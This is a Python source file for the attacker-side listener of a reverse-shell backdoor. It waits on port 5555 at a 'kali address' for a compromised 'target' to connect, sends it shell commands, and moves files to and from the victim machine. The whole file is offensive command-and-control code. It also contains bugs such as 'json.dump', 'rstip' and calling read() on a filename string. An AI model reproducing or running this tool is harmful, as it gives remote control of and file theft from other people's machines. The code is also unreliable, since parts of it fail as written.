import socket
import json
import os

def reliable_send(data):
    jsondata = json.dump(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstip()
            return json.loads(data)
        except ValueError:
            continue
def upload_file(file):
    f = open(file, 'rb')
    target.send(file.read())

def download_file(file):
    f = open(file, "wb")
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication(ip):
    while True:
        command = input(f'* Shell~{str(ip)}: ')
        reliable_send(command)
        if command == "quit":
            break
        elif command == "clear":
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == "download":
            download_file(command[9:])
        elif command[:6] == "upload":
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
kali_addr = str(input('Insert your kali address:\n'))
s.bind((kali_addr, 5555))
print('[+] Listening Connections')
s.listen(5)
target, ip = s.accept()
print(f'[+] Target Connected: {str(ip)}')
target_communication(ip)